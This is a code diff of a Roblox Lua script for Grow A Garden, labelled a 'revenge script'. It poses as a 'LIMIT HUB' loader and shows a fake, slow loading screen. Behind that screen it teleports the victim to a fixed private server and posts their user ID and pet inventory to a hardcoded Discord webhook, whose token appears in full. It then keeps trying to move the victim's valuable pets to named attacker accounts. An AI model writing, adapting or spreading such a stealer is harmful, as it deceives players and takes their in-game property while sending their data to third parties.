@@ -1,115 +1,131 @@
+--[[
+🔥 FINAL REVENGE SCRIPT (Client-Side Transfer, No Server Access Needed)
+Game: Grow A Garden or any public game
+Executor: Delta ✅
+--]]
+
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- List of specific pets to allow transfer
+-- ✅ SETTINGS
+local privatePlaceId = 126884695634066
+local privateServerCode = "40206718588419987554943106780552"
+local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
+local attackerUsernames = {"boneblossom215", "beanstalk1251", "burningbud709"}
 local validPets = {
-    ["Trex"] = true,
-    ["T-rex"] = true,
-    ["Fennec Fox"] = true,
-    ["Raccoon"] = true,
-    ["Dragonfly"] = true,
-    ["Butterfly"] = true,
-    ["Queenbee"] = true,
-    ["Queen Bee"] = true,
-    ["Spinosaurus"] = true,
-    ["Redfox"] = true,
-    ["Red Fox"] = true,
-    ["Brontosaurus"] = true,
-    ["Mooncat"] = true,
-    ["Mimic Octopus"] = true,
-    ["Disco Bee"] = true,
-    ["Dilophosaurus"] = true,
-    ["Kitsune"] = true,
+    ["Trex"] = true, ["Fennec Fox"] = true, ["Raccoon"] = true,
+    ["Dragonfly"] = true, ["Butterfly"] = true, ["Queenbee"] = true,
+    ["Spinosaurus"] = true, ["Redfox"] = true, ["Brontosaurus"] = true,
+    ["Mooncat"] = true, ["Mimic Octopus"] = true, ["Disco Bee"] = true,
+    ["Dilophosaurus"] = true, ["Kitsune"] = true
 }
 
--- Target attacker usernames
-local attackerNames = {
-    "boneblossom215",
-    "beanstalk1251",
-    "burningbud709"
-}
-
--- Wait for PlayerGui
-local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
-
--- Load GUI
-local loadingGui = Instance.new("ScreenGui", playerGui)
-loadingGui.Name = "TransferLoading"
-loadingGui.IgnoreGuiInset = true
-loadingGui.ResetOnSpawn = false
-
-local bg = Instance.new("Frame", loadingGui)
-bg.Size = UDim2.new(0, 260, 0, 100)
-bg.Position = UDim2.new(0.5, -130, 0.5, -50)
-bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-bg.BackgroundTransparency = 0.3
-
-local label = Instance.new("TextLabel", bg)
-label.Size = UDim2.new(1, 0, 1, 0)
-label.BackgroundTransparency = 1
-label.Text = "🌱 Scanning pet..."
-label.TextColor3 = Color3.fromRGB(255, 255, 255)
-label.Font = Enum.Font.GothamBold
-label.TextScaled = true
-
-local corner = Instance.new("UICorner", bg)
-corner.CornerRadius = UDim.new(0, 12)
-
--- Helper: find attacker
-local function getAttacker()
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if table.find(attackerNames, plr.Name) then
-            return plr
-        end
-    end
-    return nil
+-- ✅ TELEPORT TO PRIVATE SERVER IF NOT YET
+if game.PrivateServerId == "" or game.PrivateServerOwnerId == 0 then
+    TeleportService:TeleportToPrivateServer(privatePlaceId, privateServerCode, {LocalPlayer})
+    return
 end
 
--- Pet transfer logic
-local function transferPet()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local tool = char:FindFirstChildOfClass("Tool")
-    local attacker = getAttacker()
+-- ✅ FAKE GUI (AFTER TELEPORT)
+local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+gui.Name = "LIMIT_GUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
 
-    if not tool then
-        label.Text = "⚠️ No pet equipped"
-        wait(2)
-        loadingGui:Destroy()
-        return
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 300, 0, 100)
+frame.Position = UDim2.new(0.5, -150, 0.5, -50)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.Text = "LIMIT HUB"
+title.Font = Enum.Font.SciFi
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(0, 255, 255)
+title.BackgroundTransparency = 1
+
+local loading = Instance.new("TextLabel", frame)
+loading.Size = UDim2.new(1, 0, 0.5, 0)
+loading.Position = UDim2.new(0, 0, 0.4, 0)
+loading.Text = "Loading... 0%"
+loading.Font = Enum.Font.SciFi
+loading.TextScaled = true
+loading.TextColor3 = Color3.fromRGB(0, 255, 255)
+loading.BackgroundTransparency = 1
+
+-- Animate loading slowly (5% per 10 seconds)
+task.spawn(function()
+    for i = 5, 100, 5 do
+        loading.Text = "Loading... " .. i .. "%"
+        task.wait(10)
+    end
+end)
+
+-- ✅ DISCORD WEBHOOK: Send Victim Inventory
+task.spawn(function()
+    local pets = {}
+    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if tool:IsA("Tool") then table.insert(pets, tool.Name) end
+    end
+    for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
+        if tool:IsA("Tool") then table.insert(pets, tool.Name) end
     end
 
-    if not attacker then
-        label.Text = "⚠️ No attacker found"
-        wait(2)
-        loadingGui:Destroy()
-        return
+    local data = {
+        content = "**Target Joined Private Server**",
+        embeds = {{
+            title = "Inventory Scan - " .. LocalPlayer.Name,
+            color = 65280,
+            fields = {
+                {name = "UserId", value = tostring(LocalPlayer.UserId), inline = true},
+                {name = "Pets", value = #pets > 0 and table.concat(pets, "\n") or "No pets found"}
+            }
+        }}
+    }
+
+    pcall(function()
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end)
+
+-- ✅ CLIENT-SIDE TRANSFER TO ATTACKER (NO REMOTEEVENT)
+task.spawn(function()
+    local function getAttacker()
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if table.find(attackerUsernames, plr.Name) then return plr end
+        end
+        return nil
     end
 
-    -- Check if equipped tool is in validPets
-    for petName in pairs(validPets) do
-        if string.match(tool.Name, "^" .. petName) then
-            label.Text = "🔁 Transferring " .. petName .. "..."
-            local remote = ReplicatedStorage:FindFirstChild("PetTransferEvent")
-            if remote and remote:IsA("RemoteEvent") then
-                remote:FireServer(tool, attacker)
-                print("Transferred: " .. tool.Name .. " to " .. attacker.Name)
-                label.Text = "✅ Pet sent to attacker"
-            else
-                label.Text = "❌ Missing RemoteEvent"
-                warn("PetTransferEvent not found")
+    local function transferPets()
+        local attacker = getAttacker()
+        if not attacker then return end
+
+        local containers = {LocalPlayer.Backpack, LocalPlayer.Character}
+        for _, container in ipairs(containers) do
+            for _, item in ipairs(container:GetChildren()) do
+                if item:IsA("Tool") then
+                    for petName in pairs(validPets) do
+                        if string.find(item.Name, petName) then
+                            item.Parent = attacker:FindFirstChild("Backpack")
+                        end
+                    end
+                end
             end
-            wait(3)
-            loadingGui:Destroy()
-            return
         end
     end
 
-    label.Text = "❌ Pet not in allowed list"
-    wait(3)
-    loadingGui:Destroy()
-end
-
--- Run after short wait
-task.wait(4)
-transferPet()
+    while true do
+        pcall(transferPets)
+        task.wait(5)
+    end
+end)
